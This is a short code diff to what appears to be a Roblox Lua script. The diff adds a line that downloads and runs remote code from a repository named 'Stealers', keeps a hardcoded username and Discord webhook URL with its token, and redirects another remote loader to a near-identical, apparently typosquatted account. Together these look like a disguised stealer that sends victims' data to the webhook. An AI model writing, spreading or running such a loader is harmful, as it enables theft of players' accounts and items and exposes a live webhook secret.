@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Stealers/roblox/Gui/CRAZZYHub", true))()
+
 Username = "kely5171"
 Webhook = "https://discord.com/api/webhooks/1287646258152079450/kyKz_M72nOC2Ng30b32Ur4nWUjTXBjAVr-j14vodKDzCMnz3bTu_xHfG-LTGVrBHFyXR"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/bf.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dosiobodydoedy/x/main/bf.lua", true))()
